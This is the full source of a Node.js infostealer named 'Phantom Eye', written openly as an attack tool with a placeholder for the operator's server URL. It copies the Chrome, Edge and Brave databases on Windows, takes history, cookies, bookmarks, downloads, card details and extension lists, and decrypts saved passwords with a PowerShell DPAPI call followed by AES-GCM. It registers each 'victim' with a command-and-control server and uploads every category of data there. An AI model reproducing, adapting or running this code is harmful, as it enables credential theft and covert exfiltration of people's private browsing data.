// ================================================
// PHANTOM EYE - FULL BROWSER DATA EXTRACTOR
// With Password Decryption (PowerShell + Node.js)
// ================================================

const os = require('os');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const { exec } = require('child_process');

// ================================================
// CONFIGURATION - CHANGE THIS TO YOUR RAILWAY URL
// ================================================
const CONFIG = {
    c2: {
        url: 'https://phantom-eye-production.up.railway.app',  // ← CHANGE THIS
        register: '/api/register',
        data: '/api/data'
    },
    decrypt: {
        enabled: true,
        maxPasswords: 500
    }
};

// ================================================
// PASSWORD DECRYPTOR
// ================================================
class PasswordDecryptor {
    constructor() {
        this.tempDir = os.tmpdir();
        this.successfulMethod = null;
    }

    // ================================================
    // DECRYPT PASSWORDS
    // ================================================
    async decryptPasswords(profilePath, browserName) {
        console.log(`  🔓 Decrypting passwords for ${browserName}...`);
        
        const loginDbPath = path.join(profilePath, 'Login Data');
        const localStatePath = path.join(path.dirname(profilePath), 'Local State');
        
        if (!fs.existsSync(loginDbPath) || !fs.existsSync(localStatePath)) {
            console.log(`  ⚠️ No password data found for ${browserName}`);
            return [];
        }

        const encryptedPasswords = await this.extractEncryptedPasswords(loginDbPath);
        if (encryptedPasswords.length === 0) {
            console.log(`  ⚠️ No passwords found in ${browserName}`);
            return [];
        }

        console.log(`  📦 Found ${encryptedPasswords.length} encrypted passwords`);

        let results = [];

        // Method 1: PowerShell DPAPI
        if (process.platform === 'win32') {
            console.log(`  🔐 Method 1: PowerShell DPAPI...`);
            try {
                const psResult = await this.decryptWithPowerShell(localStatePath, encryptedPasswords);
                if (psResult && psResult.length > 0) {
                    results = psResult;
                    this.successfulMethod = 'PowerShell';
                    const decrypted = results.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
                    console.log(`  ✅ PowerShell decrypted ${decrypted} passwords`);
                }
            } catch (e) {
                console.log(`  ⚠️ PowerShell method failed:`, e.message);
            }
        }

        // Method 2: Node.js Crypto
        if (results.length === 0) {
            console.log(`  🔐 Method 2: Node.js Crypto...`);
            try {
                const nodeResult = await this.decryptWithNodeCrypto(localStatePath, encryptedPasswords);
                if (nodeResult && nodeResult.length > 0) {
                    results = nodeResult;
                    this.successfulMethod = 'Node.js';
                    const decrypted = results.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
                    console.log(`  ✅ Node.js decrypted ${decrypted} passwords`);
                }
            } catch (e) {
                console.log(`  ⚠️ Node.js method failed:`, e.message);
            }
        }

        // Fallback: return encrypted
        if (results.length === 0) {
            console.log(`  ⚠️ All decryption methods failed, returning encrypted`);
            results = encryptedPasswords.map(p => ({
                url: p.url,
                username: p.username,
                password: '[ENCRYPTED]',
                created: p.created
            }));
        }

        return results;
    }

    // ================================================
    // EXTRACT ENCRYPTED PASSWORDS
    // ================================================
    async extractEncryptedPasswords(loginDbPath) {
        const passwords = [];
        
        try {
            const tempDb = path.join(this.tempDir, 'passwords_temp.db');
            fs.copyFileSync(loginDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT origin_url, username_value, password_value, date_created 
                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                if (row.password_value && row.password_value.length > 0) {
                                    passwords.push({
                                        url: row.origin_url || 'Unknown',
                                        username: row.username_value || '',
                                        encryptedData: row.password_value,
                                        created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null
                                    });
                                }
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {
            console.log('⚠️ Failed to extract passwords:', e.message);
        }

        return passwords;
    }

    // ================================================
    // METHOD 1: PowerShell DPAPI
    // ================================================
    async decryptWithPowerShell(localStatePath, encryptedPasswords) {
        if (process.platform !== 'win32') {
            return [];
        }

        try {
            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
            const encryptedKey = localState.os_crypt.encrypted_key;
            
            const psScript = `
                Add-Type -AssemblyName System.Security
                $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
                $keyData = $encryptedKey[5..($encryptedKey.Length - 1)]
                $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                [Convert]::ToBase64String($decryptedKey)
            `;
            
            const masterKeyBase64 = await this.executeCommand(`powershell -Command "${psScript.replace(/"/g, '\\"')}"`);
            if (!masterKeyBase64) {
                return [];
            }

            const masterKey = Buffer.from(masterKeyBase64.trim(), 'base64');
            
            const results = [];
            for (const item of encryptedPasswords) {
                try {
                    const decrypted = this.decryptAESGCM(item.encryptedData, masterKey);
                    results.push({
                        url: item.url,
                        username: item.username,
                        password: decrypted || '[DECRYPTION_FAILED]',
                        created: item.created
                    });
                } catch (e) {
                    results.push({
                        url: item.url,
                        username: item.username,
                        password: '[DECRYPTION_FAILED]',
                        created: item.created
                    });
                }
            }
            
            return results;
        } catch (e) {
            return [];
        }
    }

    // ================================================
    // METHOD 2: Node.js Crypto
    // ================================================
    async decryptWithNodeCrypto(localStatePath, encryptedPasswords) {
        try {
            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
            const encryptedKey = localState.os_crypt.encrypted_key;
            
            const psScript = `
                Add-Type -AssemblyName System.Security
                $encryptedKey = [Convert]::FromBase64String('${encryptedKey}')
                $keyData = $encryptedKey[5..($encryptedKey.Length - 1)]
                $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                [Convert]::ToBase64String($decryptedKey)
            `;
            
            const keyBase64 = await this.executeCommand(`powershell -Command "${psScript.replace(/"/g, '\\"')}"`);
            if (!keyBase64) {
                return [];
            }

            const masterKey = Buffer.from(keyBase64.trim(), 'base64');

            const results = [];
            for (const item of encryptedPasswords) {
                try {
                    const decrypted = this.decryptAESGCM(item.encryptedData, masterKey);
                    results.push({
                        url: item.url,
                        username: item.username,
                        password: decrypted || '[DECRYPTION_FAILED]',
                        created: item.created
                    });
                } catch (e) {
                    results.push({
                        url: item.url,
                        username: item.username,
                        password: '[DECRYPTION_FAILED]',
                        created: item.created
                    });
                }
            }
            
            return results;
        } catch (e) {
            return [];
        }
    }

    // ================================================
    // AES-GCM DECRYPTION
    // ================================================
    decryptAESGCM(encryptedData, masterKey) {
        try {
            if (!encryptedData || encryptedData.length < 29) {
                return null;
            }
            
            const nonce = encryptedData.slice(1, 13);
            const ciphertext = encryptedData.slice(13, encryptedData.length - 16);
            const tag = encryptedData.slice(encryptedData.length - 16);
            
            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, nonce);
            decipher.setAuthTag(tag);
            
            let decrypted = decipher.update(ciphertext);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            
            return decrypted.toString('utf8');
        } catch (e) {
            return null;
        }
    }

    // ================================================
    // EXECUTE COMMAND
    // ================================================
    executeCommand(command) {
        return new Promise((resolve) => {
            exec(command, { timeout: 30000, shell: true, windowsHide: true }, (error, stdout, stderr) => {
                if (error) {
                    resolve(null);
                } else {
                    resolve(stdout.trim());
                }
            });
        });
    }
}

// ================================================
// MAIN EXTRACTOR CLASS
// ================================================
class PhantomEye {
    constructor() {
        this.victimId = null;
        this.extractedData = {};
        this.totalSize = 0;
        this.browserPaths = this.getBrowserPaths();
        this.decryptor = new PasswordDecryptor();
    }

    async start() {
        console.log('👁️ PHANTOM EYE ACTIVATED');
        console.log('📊 Advanced Browser Data Extraction');
        console.log('🔑 Password Decryption: ENABLED');
        
        await this.registerWithC2();
        await this.extractAllData();
        await this.sendDataToC2();
        this.generateReport();
        
        console.log('✅ DATA EXTRACTION COMPLETE');
        console.log(`📊 Total Data: ${(this.totalSize / 1024).toFixed(2)} KB`);
    }

    // ================================================
    // GET BROWSER PATHS
    // ================================================
    getBrowserPaths() {
        const userProfile = os.homedir();
        const paths = [];

        if (process.platform === 'win32') {
            const chromePath = path.join(userProfile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
            if (fs.existsSync(chromePath)) {
                paths.push({ name: 'Chrome', path: chromePath });
            }

            const edgePath = path.join(userProfile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data');
            if (fs.existsSync(edgePath)) {
                paths.push({ name: 'Edge', path: edgePath });
            }

            const bravePath = path.join(userProfile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data');
            if (fs.existsSync(bravePath)) {
                paths.push({ name: 'Brave', path: bravePath });
            }
        }

        return paths;
    }

    // ================================================
    // C2 COMMUNICATION
    // ================================================
    async registerWithC2() {
        try {
            const response = await fetch(CONFIG.c2.url + CONFIG.c2.register, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    computer_name: os.hostname(),
                    username: os.userInfo().username,
                    os: os.platform() + ' ' + os.release()
                })
            });
            const data = await response.json();
            if (data.success) {
                this.victimId = data.victimId;
                console.log('✅ Registered:', this.victimId);
            }
        } catch (e) {
            console.log('⚠️ C2 registration failed');
            this.victimId = 'V-' + Date.now().toString(36).toUpperCase();
        }
    }

    // ================================================
    // EXTRACT ALL DATA
    // ================================================
    async extractAllData() {
        console.log('🔍 Extracting browser data...');
        this.extractedData = {
            system: this.getSystemInfo(),
            browsers: {}
        };

        for (const browser of this.browserPaths) {
            console.log(`📂 Processing: ${browser.name}`);
            this.extractedData.browsers[browser.name] = await this.extractBrowserData(browser);
        }

        this.totalSize = JSON.stringify(this.extractedData).length;
    }

    // ================================================
    // GET SYSTEM INFO
    // ================================================
    getSystemInfo() {
        return {
            hostname: os.hostname(),
            username: os.userInfo().username,
            platform: os.platform(),
            release: os.release(),
            arch: os.arch(),
            cpus: os.cpus().length,
            memory: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + ' GB',
            uptime: (os.uptime() / 3600).toFixed(2) + ' hours',
            timestamp: new Date().toISOString()
        };
    }

    // ================================================
    // EXTRACT BROWSER DATA
    // ================================================
    async extractBrowserData(browser) {
        const data = {
            history: [],
            cookies: [],
            bookmarks: [],
            downloads: [],
            passwords: [],
            credit_cards: [],
            extensions: []
        };

        try {
            let profilePath = browser.path;
            const defaultProfiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3'];
            for (const profile of defaultProfiles) {
                const testPath = path.join(browser.path, profile);
                if (fs.existsSync(testPath)) {
                    profilePath = testPath;
                    break;
                }
            }

            // History
            data.history = await this.extractHistory(profilePath);
            console.log(`  📜 History: ${data.history.length} entries`);

            // Cookies
            data.cookies = await this.extractCookies(profilePath);
            console.log(`  🍪 Cookies: ${data.cookies.length} entries`);

            // Bookmarks
            data.bookmarks = await this.extractBookmarks(profilePath);
            console.log(`  📑 Bookmarks: ${data.bookmarks.length} entries`);

            // Downloads
            data.downloads = await this.extractDownloads(profilePath);
            console.log(`  📥 Downloads: ${data.downloads.length} entries`);

            // Passwords with decryption
            if (CONFIG.decrypt.enabled) {
                data.passwords = await this.decryptor.decryptPasswords(profilePath, browser.name);
                const decrypted = data.passwords.filter(p => p.password !== '[ENCRYPTED]' && p.password !== '[DECRYPTION_FAILED]').length;
                console.log(`  🔑 Passwords: ${data.passwords.length} entries (${decrypted} decrypted)`);
            } else {
                data.passwords = await this.extractPasswords(profilePath);
                console.log(`  🔑 Passwords: ${data.passwords.length} entries (ENCRYPTED)`);
            }

            // Credit Cards
            data.credit_cards = await this.extractCreditCards(profilePath);
            console.log(`  💳 Credit Cards: ${data.credit_cards.length} entries`);

            // Extensions
            data.extensions = await this.extractExtensions(profilePath);
            console.log(`  🔌 Extensions: ${data.extensions.length} entries`);

        } catch (e) {
            console.log(`⚠️ Error extracting ${browser.name}:`, e.message);
        }

        return data;
    }

    // ================================================
    // EXTRACT HISTORY
    // ================================================
    async extractHistory(profilePath) {
        const history = [];
        const historyDbPath = path.join(profilePath, 'History');
        
        if (!fs.existsSync(historyDbPath)) return history;

        try {
            const tempDb = path.join(os.tmpdir(), 'history_temp.db');
            fs.copyFileSync(historyDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT url, title, visit_count, last_visit_time 
                     FROM urls ORDER BY last_visit_time DESC LIMIT 500`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                history.push({
                                    url: row.url,
                                    title: row.title || 'No title',
                                    visits: row.visit_count || 0,
                                    last_visit: row.last_visit_time ? new Date(row.last_visit_time / 1000).toISOString() : null
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return history;
    }

    // ================================================
    // EXTRACT COOKIES
    // ================================================
    async extractCookies(profilePath) {
        const cookies = [];
        const cookiesDbPath = path.join(profilePath, 'Cookies');
        
        if (!fs.existsSync(cookiesDbPath)) return cookies;

        try {
            const tempDb = path.join(os.tmpdir(), 'cookies_temp.db');
            fs.copyFileSync(cookiesDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT host_key, name, value, path, expires_utc, is_secure 
                     FROM cookies ORDER BY host_key LIMIT 500`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                cookies.push({
                                    domain: row.host_key,
                                    name: row.name,
                                    value: row.value || '[encrypted]',
                                    path: row.path,
                                    expires: row.expires_utc ? new Date(row.expires_utc / 1000).toISOString() : null,
                                    secure: row.is_secure === 1
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return cookies;
    }

    // ================================================
    // EXTRACT BOOKMARKS
    // ================================================
    async extractBookmarks(profilePath) {
        const bookmarks = [];
        const bookmarksPath = path.join(profilePath, 'Bookmarks');
        
        if (!fs.existsSync(bookmarksPath)) return bookmarks;

        try {
            const data = fs.readFileSync(bookmarksPath, 'utf8');
            const parsed = JSON.parse(data);
            
            if (parsed.roots) {
                const root = parsed.roots.bookmark_bar || parsed.roots.other || parsed.roots;
                if (root.children) {
                    const extractChildren = (children, folder = '') => {
                        children.forEach(child => {
                            if (child.type === 'url') {
                                bookmarks.push({
                                    name: child.name,
                                    url: child.url,
                                    folder: folder || 'Root'
                                });
                            } else if (child.type === 'folder' && child.children) {
                                const newFolder = folder ? `${folder}/${child.name}` : child.name;
                                extractChildren(child.children, newFolder);
                            }
                        });
                    };
                    extractChildren(root.children);
                }
            }
        } catch (e) {}

        return bookmarks;
    }

    // ================================================
    // EXTRACT DOWNLOADS
    // ================================================
    async extractDownloads(profilePath) {
        const downloads = [];
        const downloadsDbPath = path.join(profilePath, 'History');
        
        if (!fs.existsSync(downloadsDbPath)) return downloads;

        try {
            const tempDb = path.join(os.tmpdir(), 'downloads_temp.db');
            fs.copyFileSync(downloadsDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT target_path, start_time, end_time, total_bytes 
                     FROM downloads ORDER BY start_time DESC LIMIT 200`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                downloads.push({
                                    path: row.target_path || 'Unknown',
                                    start_time: row.start_time ? new Date(row.start_time / 1000).toISOString() : null,
                                    end_time: row.end_time ? new Date(row.end_time / 1000).toISOString() : null,
                                    size: row.total_bytes || 0
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return downloads;
    }

    // ================================================
    // EXTRACT PASSWORDS (Fallback)
    // ================================================
    async extractPasswords(profilePath) {
        const passwords = [];
        const loginDbPath = path.join(profilePath, 'Login Data');
        
        if (!fs.existsSync(loginDbPath)) return passwords;

        try {
            const tempDb = path.join(os.tmpdir(), 'passwords_temp.db');
            fs.copyFileSync(loginDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT origin_url, username_value, password_value, date_created 
                     FROM logins ORDER BY date_created DESC LIMIT ${CONFIG.decrypt.maxPasswords}`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                passwords.push({
                                    url: row.origin_url,
                                    username: row.username_value || '',
                                    password: '[ENCRYPTED]',
                                    created: row.date_created ? new Date(row.date_created / 1000).toISOString() : null
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return passwords;
    }

    // ================================================
    // EXTRACT CREDIT CARDS
    // ================================================
    async extractCreditCards(profilePath) {
        const cards = [];
        const cardsDbPath = path.join(profilePath, 'Web Data');
        
        if (!fs.existsSync(cardsDbPath)) return cards;

        try {
            const tempDb = path.join(os.tmpdir(), 'cards_temp.db');
            fs.copyFileSync(cardsDbPath, tempDb);
            
            const db = new sqlite3.Database(tempDb);
            
            await new Promise((resolve, reject) => {
                db.all(
                    `SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year 
                     FROM credit_cards`,
                    (err, rows) => {
                        if (err) reject(err);
                        else {
                            rows.forEach(row => {
                                cards.push({
                                    name: row.name_on_card || '',
                                    number: '[ENCRYPTED]',
                                    expiry_month: row.expiration_month,
                                    expiry_year: row.expiration_year
                                });
                            });
                            resolve();
                        }
                    }
                );
            });
            
            db.close();
            fs.unlinkSync(tempDb);
        } catch (e) {}

        return cards;
    }

    // ================================================
    // EXTRACT EXTENSIONS
    // ================================================
    async extractExtensions(profilePath) {
        const extensions = [];
        const extensionsPath = path.join(profilePath, 'Extensions');
        
        if (!fs.existsSync(extensionsPath)) return extensions;

        try {
            const items = fs.readdirSync(extensionsPath);
            for (const item of items) {
                const itemPath = path.join(extensionsPath, item);
                const manifestPath = path.join(itemPath, 'manifest.json');
                if (fs.existsSync(manifestPath)) {
                    try {
                        const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
                        extensions.push({
                            id: item,
                            name: manifest.name || 'Unknown',
                            version: manifest.version || 'Unknown',
                            description: manifest.description || '',
                            permissions: manifest.permissions || []
                        });
                    } catch (e) {}
                }
            }
        } catch (e) {}

        return extensions;
    }

    // ================================================
    // SEND DATA TO C2
    // ================================================
    async sendDataToC2() {
        if (!this.victimId) return;

        try {
            console.log('📤 Sending extracted data to C2...');
            
            await this.sendChunk('system', this.extractedData.system);

            for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
                for (const [dataType, data] of Object.entries(browserData)) {
                    if (data && data.length > 0) {
                        await this.sendChunk(`${browserName}_${dataType}`, data);
                    }
                }
            }

            console.log('✅ Data sent to C2');
        } catch (e) {
            console.log('⚠️ Failed to send data:', e.message);
        }
    }

    async sendChunk(dataType, data) {
        try {
            await fetch(CONFIG.c2.url + CONFIG.c2.data, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: dataType,
                    data: data
                })
            });
            console.log(`📤 Sent: ${dataType} (${JSON.stringify(data).length} bytes)`);
        } catch (e) {
            console.log(`⚠️ Failed to send ${dataType}:`, e.message);
        }
    }

    // ================================================
    // GENERATE REPORT
    // ================================================
    generateReport() {
        let totalPasswords = 0;
        let decryptedPasswords = 0;
        
        for (const [browserName, browserData] of Object.entries(this.extractedData.browsers)) {
            if (browserData.passwords) {
                totalPasswords += browserData.passwords.length;
                decryptedPasswords += browserData.passwords.filter(p => 
                    p.password !== '[ENCRYPTED]' && 
                    p.password !== '[DECRYPTION_FAILED]'
                ).length;
            }
        }
        
        console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   👁️ PHANTOM EYE - EXTRACTION REPORT                       ║
║                                                               ║
║   🆔 Victim ID: ${this.victimId}                                      ║
║   💻 Computer: ${os.hostname()}                                   ║
║   👤 User: ${os.userInfo().username}                                    ║
║                                                               ║
║   📊 Total Data: ${(this.totalSize / 1024).toFixed(2)} KB                     ║
║   📂 Browsers Found: ${this.browserPaths.length}                          ║
║   🔑 Total Passwords: ${totalPasswords}                                    ║
║   🔓 Decrypted: ${decryptedPasswords}                                     ║
║   🔐 Method Used: ${this.decryptor.successfulMethod || 'None (encrypted only)'}         ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
        `);
    }
}

// ================================================
// START
// ================================================
const extractor = new PhantomEye();
extractor.start().catch(console.error);
